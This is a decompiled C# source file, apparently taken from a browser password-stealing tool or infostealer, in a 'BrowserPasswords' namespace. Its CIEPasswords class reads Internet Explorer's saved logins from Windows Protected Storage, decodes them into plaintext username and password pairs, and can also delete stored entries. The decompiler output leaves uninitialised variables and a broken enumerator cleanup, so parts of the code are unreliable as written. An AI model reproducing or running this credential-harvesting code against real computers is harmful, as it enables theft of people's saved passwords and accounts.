using System;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using BrowserPasswords.PStoreLib;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace BrowserPasswords
{
	// Token: 0x0200001D RID: 29
	internal class CIEPasswords : IEnumerable<CIEPassword>
	{
		// Token: 0x0600011A RID: 282 RVA: 0x000037F4 File Offset: 0x000019F4
		public CIEPasswords()
		{
			this.guidIE = new Guid("{E161255A-37C3-11D2-BCAA-00C04FD929DB}");
			this.m_PStore = new CProtectStore();
			this.m_IEPass = new List<CIEPassword>();
		}

		// Token: 0x0600011B RID: 283
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "RtlMoveMemory", ExactSpelling = true, SetLastError = true)]
		private static extern void CopyMemory(IntPtr Destination, IntPtr Source, int Length);

		// Token: 0x0600011C RID: 284
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int lstrlenA(IntPtr lpString);

		// Token: 0x0600011D RID: 285
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int FileTimeToLocalFileTime(ref CIEPasswords.FILETIME lpFileTime, ref CIEPasswords.FILETIME lpLocalFileTime);

		// Token: 0x0600011E RID: 286
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int FileTimeToSystemTime(ref CIEPasswords.FILETIME lpFileTime, ref CIEPasswords.SYSTEMTIME lpSystemTime);

		// Token: 0x0600011F RID: 287 RVA: 0x00003824 File Offset: 0x00001A24
		private DateTime FileTimeToDate(ref CIEPasswords.FILETIME ftDateTime)
		{
			CIEPasswords.FileTimeToLocalFileTime(ref ftDateTime, ref this.$STATIC$FileTimeToDate$201112110117C$lft);
			CIEPasswords.FileTimeToSystemTime(ref this.$STATIC$FileTimeToDate$201112110117C$lft, ref this.$STATIC$FileTimeToDate$201112110117C$lst);
			return DateTime.FromOADate(DateAndTime.DateSerial((int)this.$STATIC$FileTimeToDate$201112110117C$lst.wYear, (int)this.$STATIC$FileTimeToDate$201112110117C$lst.wMonth, (int)this.$STATIC$FileTimeToDate$201112110117C$lst.wDay).ToOADate() + DateAndTime.TimeSerial((int)this.$STATIC$FileTimeToDate$201112110117C$lst.wHour, (int)this.$STATIC$FileTimeToDate$201112110117C$lst.wMinute, (int)this.$STATIC$FileTimeToDate$201112110117C$lst.wSecond).ToOADate());
		}

		// Token: 0x06000120 RID: 288 RVA: 0x000038B4 File Offset: 0x00001AB4
		private void AddPasswdInfo(string strRess)
		{
			CIEPasswords.StringIndexEntry stringIndexEntry;
			int num = Strings.Len(stringIndexEntry);
			CIEPasswords.StringIndexHeader stringIndexHeader;
			int num2 = Strings.Len(stringIndexHeader);
			byte[] value = this.m_PStore.ReadItem(this.guidIE, this.guidIE, strRess + ":StringData");
			byte[] value2 = this.m_PStore.ReadItem(this.guidIE, this.guidIE, strRess + ":StringIndex");
			GCHandle gchandle = GCHandle.Alloc(value2, GCHandleType.Pinned);
			IntPtr intPtr = gchandle.AddrOfPinnedObject();
			object obj = Marshal.PtrToStructure(intPtr, stringIndexHeader.GetType());
			CIEPasswords.StringIndexHeader stringIndexHeader2;
			stringIndexHeader = ((obj != null) ? ((CIEPasswords.StringIndexHeader)obj) : stringIndexHeader2);
			gchandle.Free();
			gchandle = GCHandle.Alloc(value, GCHandleType.Pinned);
			GCHandle gchandle2 = GCHandle.Alloc(value2, GCHandleType.Pinned);
			IntPtr value3 = gchandle.AddrOfPinnedObject();
			IntPtr ptr = gchandle2.AddrOfPinnedObject();
			checked
			{
				intPtr = new IntPtr(ptr.ToInt32() + stringIndexHeader.dwStructSize);
				if (stringIndexHeader.dwType == 1)
				{
					if (stringIndexHeader.dwEntriesCount >= 2)
					{
						int num3 = 0;
						int num4 = stringIndexHeader.dwEntriesCount - 1;
						for (int i = num3; i <= num4; i += 2)
						{
							if (value3 == IntPtr.Zero | intPtr == IntPtr.Zero)
							{
								return;
							}
							object obj2 = Marshal.PtrToStructure(intPtr, stringIndexEntry.GetType());
							CIEPasswords.StringIndexEntry stringIndexEntry2;
							stringIndexEntry = ((obj2 != null) ? ((CIEPasswords.StringIndexEntry)obj2) : stringIndexEntry2);
							IntPtr intPtr2 = new IntPtr(value3.ToInt32() + stringIndexEntry.dwDataOffset);
							string szUserName;
							if (CIEPasswords.lstrlenA(intPtr2) != stringIndexEntry.dwDataSize)
							{
								ptr = new IntPtr(value3.ToInt32() + stringIndexEntry.dwDataOffset);
								szUserName = Marshal.PtrToStringUni(ptr);
							}
							else
							{
								intPtr2 = new IntPtr(value3.ToInt32() + stringIndexEntry.dwDataOffset);
								szUserName = Marshal.PtrToStringAnsi(intPtr2);
							}
							intPtr = new IntPtr(intPtr.ToInt32() + num);
							object obj3 = Marshal.PtrToStructure(intPtr, stringIndexEntry.GetType());
							stringIndexEntry = ((obj3 != null) ? ((CIEPasswords.StringIndexEntry)obj3) : stringIndexEntry2);
							intPtr2 = new IntPtr(value3.ToInt32() + stringIndexEntry.dwDataOffset);
							string szPasswd;
							if (CIEPasswords.lstrlenA(intPtr2) != stringIndexEntry.dwDataSize)
							{
								ptr = new IntPtr(value3.ToInt32() + stringIndexEntry.dwDataOffset);
								szPasswd = Marshal.PtrToStringUni(ptr);
							}
							else
							{
								intPtr2 = new IntPtr(value3.ToInt32() + stringIndexEntry.dwDataOffset);
								szPasswd = Marshal.PtrToStringAnsi(intPtr2);
							}
							intPtr = new IntPtr(intPtr.ToInt32() + num);
							this.m_IEPass.Add(new CIEPassword(this.m_PStore, strRess, szUserName, szPasswd, this.FileTimeToDate(ref stringIndexEntry.ftInsertDateTime), 1));
						}
					}
				}
				else if (stringIndexHeader.dwType == 0)
				{
					if (value3 == IntPtr.Zero | intPtr == IntPtr.Zero)
					{
						return;
					}
					int num5 = 0;
					int num6 = stringIndexHeader.dwEntriesCount - 1;
					for (int j = num5; j <= num6; j++)
					{
						object obj4 = Marshal.PtrToStructure(intPtr, stringIndexEntry.GetType());
						CIEPasswords.StringIndexEntry stringIndexEntry2;
						stringIndexEntry = ((obj4 != null) ? ((CIEPasswords.StringIndexEntry)obj4) : stringIndexEntry2);
						string szUserName = Strings.Space(stringIndexEntry.dwDataSize);
						IntPtr intPtr2 = new IntPtr(value3.ToInt32() + stringIndexEntry.dwDataOffset);
						if (CIEPasswords.lstrlenA(intPtr2) != stringIndexEntry.dwDataSize)
						{
							ptr = new IntPtr(value3.ToInt32() + stringIndexEntry.dwDataOffset);
							szUserName = Marshal.PtrToStringUni(ptr);
						}
						else
						{
							intPtr2 = new IntPtr(value3.ToInt32() + stringIndexEntry.dwDataOffset);
							szUserName = Marshal.PtrToStringAnsi(intPtr2);
						}
						intPtr = new IntPtr(intPtr.ToInt32() + num);
						this.m_IEPass.Add(new CIEPassword(this.m_PStore, strRess, szUserName, string.Empty, this.FileTimeToDate(ref stringIndexEntry.ftInsertDateTime), 0));
					}
				}
				gchandle.Free();
				gchandle2.Free();
			}
		}

		// Token: 0x1700006E RID: 110
		// (get) Token: 0x06000121 RID: 289 RVA: 0x00003C98 File Offset: 0x00001E98
		// (set) Token: 0x06000122 RID: 290 RVA: 0x00003CB0 File Offset: 0x00001EB0
		public PST_KEY KeyType
		{
			get
			{
				return this.m_KeyType;
			}
			set
			{
				this.m_KeyType = value;
				this.m_PStore.KeyType = value;
			}
		}

		// Token: 0x06000123 RID: 291 RVA: 0x00003CC8 File Offset: 0x00001EC8
		public void DeletePart(string szResourceName, string szWord)
		{
			CIEPasswords.StringIndexEntry stringIndexEntry;
			int num = Strings.Len(stringIndexEntry);
			CIEPasswords.StringIndexHeader stringIndexHeader;
			int num2 = Strings.Len(stringIndexHeader);
			byte[] array = this.m_PStore.ReadItem(this.guidIE, this.guidIE, szResourceName + ":StringData");
			byte[] array2 = this.m_PStore.ReadItem(this.guidIE, this.guidIE, szResourceName + ":StringIndex");
			GCHandle gchandle = GCHandle.Alloc(array2, GCHandleType.Pinned);
			IntPtr ptr = gchandle.AddrOfPinnedObject();
			object obj = Marshal.PtrToStructure(ptr, stringIndexHeader.GetType());
			CIEPasswords.StringIndexHeader stringIndexHeader2;
			stringIndexHeader = ((obj != null) ? ((CIEPasswords.StringIndexHeader)obj) : stringIndexHeader2);
			gchandle.Free();
			gchandle = GCHandle.Alloc(array, GCHandleType.Pinned);
			GCHandle gchandle2 = GCHandle.Alloc(array2, GCHandleType.Pinned);
			IntPtr intPtr = gchandle.AddrOfPinnedObject();
			IntPtr intPtr2 = gchandle2.AddrOfPinnedObject();
			checked
			{
				ptr = new IntPtr(intPtr2.ToInt32() + stringIndexHeader.dwStructSize);
				if (stringIndexHeader.dwType == 1 | stringIndexHeader.dwEntriesCount == 1)
				{
					this.Delete(szResourceName);
				}
				else if (stringIndexHeader.dwType == 0)
				{
					byte[] value = new byte[Information.UBound(array, 1) + 1];
					byte[] value2 = new byte[Information.UBound(array2, 1) + 1];
					GCHandle gchandle3 = GCHandle.Alloc(value, GCHandleType.Pinned);
					GCHandle gchandle4 = GCHandle.Alloc(value2, GCHandleType.Pinned);
					intPtr = gchandle.AddrOfPinnedObject();
					ptr = new IntPtr(gchandle2.AddrOfPinnedObject().ToInt32() + stringIndexHeader.dwStructSize);
					IntPtr intPtr3 = gchandle3.AddrOfPinnedObject();
					IntPtr intPtr4 = gchandle4.AddrOfPinnedObject();
					IntPtr ptr2 = new IntPtr(intPtr4.ToInt32() + stringIndexHeader.dwStructSize);
					int num3 = 0;
					int num4 = stringIndexHeader.dwEntriesCount - 1;
					int num5;
					for (int i = num3; i <= num4; i++)
					{
						object obj2 = Marshal.PtrToStructure(ptr, stringIndexEntry.GetType());
						CIEPasswords.StringIndexEntry stringIndexEntry2;
						stringIndexEntry = ((obj2 != null) ? ((CIEPasswords.StringIndexEntry)obj2) : stringIndexEntry2);
						string left = Strings.Space(stringIndexEntry.dwDataSize);
						intPtr4 = new IntPtr(intPtr.ToInt32() + stringIndexEntry.dwDataOffset);
						if (CIEPasswords.lstrlenA(intPtr4) != stringIndexEntry.dwDataSize)
						{
							intPtr2 = new IntPtr(intPtr.ToInt32() + stringIndexEntry.dwDataOffset);
							left = Marshal.PtrToStringUni(intPtr2, stringIndexEntry.dwDataSize * 2);
							if (Operators.CompareString(left, szWord, false) != 0)
							{
								intPtr4 = new IntPtr(intPtr3.ToInt32() + num5);
								IntPtr destination = intPtr4;
								intPtr2 = new IntPtr(intPtr.ToInt32() + stringIndexEntry.dwDataOffset);
								CIEPasswords.CopyMemory(destination, intPtr2, stringIndexEntry.dwDataSize * 2);
								stringIndexEntry.dwDataOffset = num5;
								Marshal.StructureToPtr(stringIndexEntry, ptr2, false);
								num5 = num5 + stringIndexEntry.dwDataSize * 2 + 2;
								ptr2 = new IntPtr(ptr2.ToInt32() + num);
							}
						}
						else
						{
							intPtr4 = new IntPtr(intPtr.ToInt32() + stringIndexEntry.dwDataOffset);
							left = Marshal.PtrToStringAnsi(intPtr4, stringIndexEntry.dwDataSize * 2);
							if (Operators.CompareString(left, szWord, false) != 0)
							{
								intPtr4 = new IntPtr(intPtr3.ToInt32() + num5);
								IntPtr destination2 = intPtr4;
								intPtr2 = new IntPtr(intPtr.ToInt32() + stringIndexEntry.dwDataOffset);
								CIEPasswords.CopyMemory(destination2, intPtr2, stringIndexEntry.dwDataSize);
								stringIndexEntry.dwDataOffset = num5;
								Marshal.StructureToPtr(stringIndexEntry, ptr2, false);
								num5 = num5 + stringIndexEntry.dwDataSize + 1;
								ptr2 = new IntPtr(ptr2.ToInt32() + num);
							}
						}
						ptr = new IntPtr(ptr.ToInt32() + num);
					}
					stringIndexHeader.dwEntriesCount--;
					Marshal.StructureToPtr(stringIndexHeader, ptr2, false);
					this.m_PStore.WriteItem(this.guidIE, this.guidIE, szResourceName + ":StringData", intPtr3.ToInt32(), num5);
					this.m_PStore.WriteItem(this.guidIE, this.guidIE, szResourceName + ":StringIndex", ptr2.ToInt32(), num2 + stringIndexHeader.dwEntriesCount * num);
					gchandle3.Free();
					gchandle4.Free();
				}
				gchandle.Free();
				gchandle2.Free();
			}
		}

		// Token: 0x06000124 RID: 292 RVA: 0x000040D8 File Offset: 0x000022D8
		public void Delete(string szResourceName)
		{
			this.m_PStore.DeleteItem(this.guidIE, this.guidIE, szResourceName + ":StringData");
			this.m_PStore.DeleteItem(this.guidIE, this.guidIE, szResourceName + ":StringIndex");
		}

		// Token: 0x06000125 RID: 293 RVA: 0x0000412C File Offset: 0x0000232C
		public void Refresh()
		{
			this.m_IEPass.Clear();
			CItems citems = this.m_PStore.get_Items(this.guidIE, this.guidIE);
			checked
			{
				if (citems != null)
				{
					int num = 0;
					try
					{
						foreach (object obj in citems)
						{
							CItem citem = (CItem)obj;
							if (num % 2 == 0)
							{
								this.AddPasswdInfo(Strings.Mid(citem.Name, 1, Strings.InStr(citem.Name, ":String", CompareMethod.Binary) - 1));
							}
							num++;
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		// Token: 0x06000126 RID: 294 RVA: 0x000041D4 File Offset: 0x000023D4
		public IEnumerator<CIEPassword> GetEnumerator()
		{
			this.Refresh();
			return (IEnumerator<CIEPassword>)this.m_IEPass.GetEnumerator();
		}

		// Token: 0x06000127 RID: 295 RVA: 0x00004200 File Offset: 0x00002400
		public IEnumerator GetEnumerator1()
		{
			this.Refresh();
			return (IEnumerator)this.m_IEPass.GetEnumerator();
		}

		// Token: 0x040000E6 RID: 230
		private readonly Guid guidIE;

		// Token: 0x040000E7 RID: 231
		private CProtectStore m_PStore;

		// Token: 0x040000E8 RID: 232
		private PST_KEY m_KeyType;

		// Token: 0x040000E9 RID: 233
		private List<CIEPassword> m_IEPass;

		// Token: 0x040000EA RID: 234
		private CIEPasswords.SYSTEMTIME $STATIC$FileTimeToDate$201112110117C$lst;

		// Token: 0x040000EB RID: 235
		private CIEPasswords.FILETIME $STATIC$FileTimeToDate$201112110117C$lft;

		// Token: 0x0200001E RID: 30
		private struct StringIndexHeader
		{
			// Token: 0x040000EC RID: 236
			public int dwWICK;

			// Token: 0x040000ED RID: 237
			public int dwStructSize;

			// Token: 0x040000EE RID: 238
			public int dwEntriesCount;

			// Token: 0x040000EF RID: 239
			public int dwUnkId;

			// Token: 0x040000F0 RID: 240
			public int dwType;

			// Token: 0x040000F1 RID: 241
			public int dwUnk;
		}

		// Token: 0x0200001F RID: 31
		private struct FILETIME
		{
			// Token: 0x040000F2 RID: 242
			public int dwLow;

			// Token: 0x040000F3 RID: 243
			public int dwHigh;
		}

		// Token: 0x02000020 RID: 32
		private struct StringIndexEntry
		{
			// Token: 0x040000F4 RID: 244
			public int dwDataOffset;

			// Token: 0x040000F5 RID: 245
			public CIEPasswords.FILETIME ftInsertDateTime;

			// Token: 0x040000F6 RID: 246
			public int dwDataSize;
		}

		// Token: 0x02000021 RID: 33
		[StructLayout(LayoutKind.Sequential, Pack = 2)]
		private struct SYSTEMTIME
		{
			// Token: 0x040000F7 RID: 247
			public short wYear;

			// Token: 0x040000F8 RID: 248
			public short wMonth;

			// Token: 0x040000F9 RID: 249
			public short wDayOfWeek;

			// Token: 0x040000FA RID: 250
			public short wDay;

			// Token: 0x040000FB RID: 251
			public short wHour;

			// Token: 0x040000FC RID: 252
			public short wMinute;

			// Token: 0x040000FD RID: 253
			public short wSecond;

			// Token: 0x040000FE RID: 254
			public short wMilliseconds;
		}

		// Token: 0x02000022 RID: 34
		private struct IEPass
		{
			// Token: 0x040000FF RID: 255
			public int dwType;

			// Token: 0x04000100 RID: 256
			public string strResource;

			// Token: 0x04000101 RID: 257
			public string strUserName;

			// Token: 0x04000102 RID: 258
			public string strPassword;

			// Token: 0x04000103 RID: 259
			public DateTime ftAddDate;
		}
	}
}
